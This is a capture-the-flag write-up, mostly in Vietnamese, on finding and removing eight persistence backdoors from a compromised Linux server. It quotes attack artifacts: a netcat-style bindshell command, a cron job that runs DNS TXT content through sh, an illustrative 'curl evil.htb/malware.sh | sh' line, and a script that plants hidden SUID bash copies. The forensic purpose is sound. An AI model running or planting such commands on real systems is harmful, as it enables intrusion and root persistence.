# PersistenceIsFutile
## CHALLENGE DESCRIPTION
:::info
Hackers made it onto one of our production servers 😅. We've isolated it from the internet until we can clean the machine up. The IR team reported eight difference backdoors on the server, but didn't say what they were and we can't get in touch with them. We need to get this server back into prod ASAP - we're losing money every second it's down. Please find the eight backdoors (both remote access and privilege escalation) and remove them. Once you're done, run `/root/solveme` as root to check. You have SSH access and sudo rights to the box with the connections details attached below.
:::

## Tools use
- SSH
- ChatGPT
 
# Analysis
![image](https://hackmd.io/_uploads/ryg_NNLWlx.png)

Từ Cyber Kill Chain có thể thấy khi máy chủ đã bị lây nhiễm thì ở giai đoạn **Installation**, attacker cố gắng cài cắm backdoor khắp nơi. Do đó mục tiêu của ta sẽ là tìm và xóa hết chúng

## /etc/passwd
Khi attacker xâm nhập vào hệ thống khả năng hắn sẽ tạo thêm user để giữ mọi thứ tách biệt 

![image](https://hackmd.io/_uploads/rydGLEIWgl.png)

Để xem user nào có thể dùng shell ta sử dụng lệnh
```
cat /etc/passwd | grep -i "/bash"
```

Có 3 user mà kết quả trả ra
```
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ cat /etc/passwd | grep -i "/bash"
root:x:0:0:root:/root:/bin/bash
gnats:x:41:0:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/bash
user:x:1000:1000::/home/user:/bin/bash
```

Từ kết quả trên thấy được `gnats` khả nghi. Xóa user, bỏ khỏi nhóm root và check `/root/solveme`

```
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ sudo usermod -s /usr/sbin/nologin gnats
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ sudo usermod -g 1000 gnats    
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ sudo /root/solveme
Issue 4 is fully remediated
```

## Analysis processes and subprocesses
### connectivity-check
Để kiểm tra các tiến trình hoặc con của nó ta dùng lệnh 
```
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ ps -auxf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2616   596 ?        Ss   16:03   0:00 /bin/sh -c /usr/sbin/sshd -D -p 23
root           7  0.0  0.0  12184  7100 ?        S    16:03   0:00 sshd: /usr/sbin/sshd -D -p 23 [listener] 0 of 10-100 startups
root          12  0.0  0.1  13900  8612 ?        Ss   16:14   0:00  \_ sshd: user [priv]
user          26  0.0  0.0  13900  5228 ?        S    16:14   0:00      \_ sshd: user@pts/0
user          27  0.0  0.0   6000  3824 pts/0    Ss   16:14   0:00          \_ -bash
user          77  0.0  0.0   7896  3260 pts/0    R+   16:22   0:00              \_ ps -auxf
root          22  0.0  0.0   3984  3020 ?        S    16:14   0:00 /bin/bash /var/lib/private/connectivity-check
root          76  0.0  0.0   3984   240 ?        S    16:21   0:00  \_ /bin/bash /var/lib/private/connectivity-check
```

Kết quả cho thấy có PID 22 và con của nó (76) đang chạy file `connectivity-check`, kiểm tra nội dung của nó thông qua đường dẫn

![image](https://hackmd.io/_uploads/BJN_dVLWeg.png)

`connectivity-check` được chạy liên tục và tạo 1 revershell từ ip **172.17.0.1** với `nohup` sẽ giúp tiến trình không bị kill khi logout

Xóa file này và kill tiến trình sau đó check `/root/solveme`

```
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ sudo rm /var/lib/private/connectivity-check
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ sudo kill 22
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ sudo /root/solveme
```
Tuy nhiên `/root/solveme` chỉ trả về kết quả chưa xóa hoàn toàn. Có lẽ nó vẫn nằm ở đâu đó nữa 
```
root@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/home/user# find / -type f  -name *connectivity-check* 2>/dev/null
/etc/update-motd.d/30-connectivity-check
root@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/home/user# rm /etc/update-motd.d/30-connectivity-check
root@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/home/user# /root/solveme 
Issue 5 is fully remediated
```

### alertd
Như mô tả thì quyền cao cũng bị nhiễm nên `su` để xem có tiền trình nào đang chạy không 
```
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ sudo su
root@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/home/user# ps -auxf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2616   596 ?        Ss   16:03   0:00 /bin/sh -c /usr/sbin/sshd -D -p 23
root           7  0.0  0.0  12184  7100 ?        S    16:03   0:00 sshd: /usr/sbin/sshd -D -p 23 [listener] 0 of 10-100 startups
root          12  0.0  0.1  13900  8612 ?        Ss   16:14   0:00  \_ sshd: user [priv]
user          26  0.0  0.0  13900  5228 ?        S    16:14   0:00      \_ sshd: user@pts/0
user          27  0.0  0.0   6000  3828 pts/0    Ss   16:14   0:00          \_ -bash
root         104  0.0  0.0   8052  4540 pts/0    S    16:36   0:00              \_ sudo su
root         105  0.0  0.0   7024  3640 pts/0    S    16:36   0:00                  \_ su
root         106  0.0  0.0   6000  3940 pts/0    S    16:36   0:00                      \_ bash
root         113  0.0  0.0   2596  1960 pts/0    S    16:36   0:00                          \_ alertd -e /bin/bash -lnp 4444
root         114  0.0  0.0   7896  3288 pts/0    R+   16:36   0:00                          \_ ps -auxf
```
Kết quả lại thấy một file đang thực hiện một bindshell, ta sẽ kiểm tra xem file thực thi này ở đâu đồng thời kill tiến trình này

```
root@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/home/user# sudo kill 113

[1]+  Exit 1                  alertd -e /bin/bash -lnp 4444
root@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/home/user# which alertd
/usr/bin/alertd
root@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/home/user# rm /usr/bin/alertd
```
Cũng như [connectivity-check](#connectivity-check), nó chưa bị xóa sạch : ). Khi ta về user thường và `su` ta sẽ thấy như này

![image](https://hackmd.io/_uploads/BJgH6VU-el.png)

![image](https://hackmd.io/_uploads/ryPJCVL-ee.png)

Tức là chỉ mới xóa file nhưng việc kích hoạt file vẫn còn. Để xóa tận gốc tìm hiểu được đó là khi `su` nó đã được cài ở `/root/.bashrc` 

>  /root/.bashrc là một file cấu hình cá nhân dành riêng cho người dùng root, được chạy mỗi khi root đăng nhập vào shell. Nếu muốn kiểm tra của user nào thì nó sẽ là /\[user]/.bashrc

![image](https://hackmd.io/_uploads/BJ9X04UZge.png)

Xóa và kiểm tra `/root/solveme`
```
root@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/home/user# vi /root/.bashrc
root@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/home/user# /root/solveme 
Issue 1 is fully remediated
```

### cat
Khi check `/root/.bashrc` ta còn thấy lệnh `alias` của cat, khi dùng cat nó sẽ thực hiện lệnh để revershell

![image](https://hackmd.io/_uploads/S13mZr8bxl.png)

Xóa và check `/root/solveme`
```
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ sudo vi ~/.bashrc 
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ sudo /root/solveme
Issue 6 is fully remediated
```

## .backdoor
Khi đang tab để dọc `/.bashrc` thì phát hiện được file `.backdoor` nhưng lại không nhận được kết quả gì mới từ `/root/solveme`

![image](https://hackmd.io/_uploads/Sy7MZHUZle.png)

## Crontab
### crontab -l 
Giờ kiểm tra crontab để xem có những cronjob nào đang chạy
![image](https://hackmd.io/_uploads/B1W2ySUWll.png)

```
/bin/sh -c "sh -c $(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"
```
Lệnh này sẽ lấy nội dung TXT record từ domain `imf0rce.htb` rồi nhúng kết quả đó vào trong `sh -c`. Kết quả khi nó `dig` được có thể như sau

```
"curl http://evil.htb/malware.sh | sh"

sh -c "curl http://evil.htb/malware.sh | sh"
```

Xóa và check `/root/solveme`
```
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ sudo vi /var/spool/cron/crontabs/user
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ sudo /root/solveme
Issue 8 is fully remediated
```
### ls /etc/cron*
Dùng lệnh này sẽ thế được các tiến trình đang được lập lịch ở tất cả chế độ
```
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:~$ ls /etc/cron*
/etc/crontab

/etc/cron.d:
anacron  e2scrub_all  popularity-contest

/etc/cron.daily:
0anacron  access-up  apt-compat  bsdmainutils  dpkg  logrotate  man-db  popularity-contest  pyssh

/etc/cron.hourly:

/etc/cron.monthly:
0anacron

/etc/cron.weekly:
0anacron  man-db
```

Chú ý ở đây có 2 file lạ 

![image](https://hackmd.io/_uploads/BJcUBSLZgx.png)

:::spoiler Nội dung access-up
```python
#!/bin/bash

DIRS=("/bin" "/sbin")
DIR=${DIRS[$[ $RANDOM % 2 ]]}

while : ; do
    NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
    [[ -f "{$DIR}/${NEW_UUID}" ]] || break
done

cp /bin/bash ${DIR}/${NEW_UUID}
touch ${DIR}/${NEW_UUID} -r /bin/bash
chmod 4755 ${DIR}/${NEW_UUID}
```
:::

:::spoiler Nội dung pyssh
```python
#!/bin/sh

VER=$(python3 -c 'import ssh_import_id; print(ssh_import_id.VERSION)')
MAJOR=$(echo $VER | cut -d'.' -f1)

if [ $MAJOR -le 6 ]; then
    /lib/python3/dist-packages/ssh_import_id_update
fi
```
:::

#### access-up
File `access-up` đang thực hiện tạo một bản sao ẩn của `/bin/bash` với quyền SUID, từ đó cho phép người dùng bất kỳ thực thi shell với quyền root

Từ đây có thể thấy rằng chắc chắn khi lịch được chạy đã có nhiều file được tạo và chạy, do đó ta cần xóa file và lập lịch này trước đến hạn chế file được spawn thêm nhiều sau đó tìm các file được tạo các file được cấp quyền root

```
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/etc/cron.daily$ sudo rm access-up
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/etc/cron.daily$ find / -perm 4755 2>/dev/null
```

![image](https://hackmd.io/_uploads/SJiMvBL-xe.png)

Xóa file được tạo ngẫu nhiên và check lại `/root/solveme`
```
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/etc/cron.daily$ sudo rm /usr/bin/dlxcrw
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/etc/cron.daily$ sudo rm /usr/bin/mgxttm
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/etc/cron.daily$ sudo rm /usr/sbin/afdluk
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/etc/cron.daily$ sudo rm /usr/sbin/ppppd
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/etc/cron.daily$ sudo /root/solveme
Issue 3 is fully remediated
Issue 7 is fully remediated
```

#### pyssh
File `pyssh` kiểm tra phiên bản của thư viện Python `ssh-import-id`, và chạy một file nếu phiên bản đó nhỏ hơn hoặc bằng 6 đồng thời gen keyssh

Tuy nhiên File `/lib/python3/dist-packages/ssh_import_id_update` không tồn tại theo mặc định. Đã đã là một dấu hiệu đáng ngờ

Ta sẽ xóa file và kiểm tra `/lib/python3/dist-packages/ssh_import_id_update` có tồn tại không, nếu có thì xóa + xóa ssh key được gen ra ở -> check `/root/solveme`

```
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/etc/cron.daily$ sudo rm /lib/python3/dist-packages/ssh_import_id_update
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/etc/cron.daily$ sudo rm -r /root/.ssh
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/etc/cron.daily$ sudo /root/solveme
Traceback (most recent call last):
  File "<dist/obf/solveme.py>", line 4, in <module>
  File "<frozen solveme>", line 65, in <module>
KeyError: '/root/.ssh/authorized_keys'
[380] Failed to execute script solveme
```

Cút luôn :))) làm lại từ đầu. Lý do là vì chỉ được xóa file `authorized_keys` nếu không thì không còn phiên ssh để chạy `solveme` nữa 

```
user@ng-1798031-forensicspersistence-hemna-5868f7fd4f-v5rb2:/etc/cron.daily$ sudo /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is fully remediated
Issue 5 is fully remediated
Issue 6 is fully remediated
Issue 7 is fully remediated
Issue 8 is fully remediated

Congrats: HTB{7tr3@t_XXXXX}
```

